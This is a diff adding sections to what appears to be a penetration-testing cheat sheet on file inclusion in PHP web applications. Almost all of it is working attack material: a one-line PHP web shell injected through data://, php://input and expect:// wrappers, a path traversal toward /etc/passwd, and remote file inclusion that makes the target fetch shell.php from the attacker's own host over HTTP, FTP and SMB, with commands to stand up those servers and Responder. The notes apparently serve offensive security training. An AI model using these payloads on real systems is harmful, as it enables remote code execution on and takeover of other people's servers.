@@ -184,3 +184,48 @@ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do 
 ```bash
 echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
 ```
+
+## PHP Wrappers
+- `allow_url_include = On` settings enabled
+```bash
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+```
+```bash
+# php configuration
+/etc/php/X.Y/apache2/php.ini
+
+/etc/php/X.Y/fpm/php.ini
+```
+```bash
+# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+echo '<?php system($_GET["cmd"]); ?>' | base64
+
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
+```
+```bash
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+
+curl -s -X POST --data '<\?php system('id')?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input
+```
+
+### Expect
+- `extension=expect` settings enabled
+```bash
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+```
+
+# RFI
+- http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+- http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+## FTP
+```bash
+sudo python -m pyftpdlib -p 21
+```
+- http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+## SMB
+```bash
+impacket-smbserver -smb2support share $(pwd)
+
+sudo responder -I tun0 -v
+```
+- http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
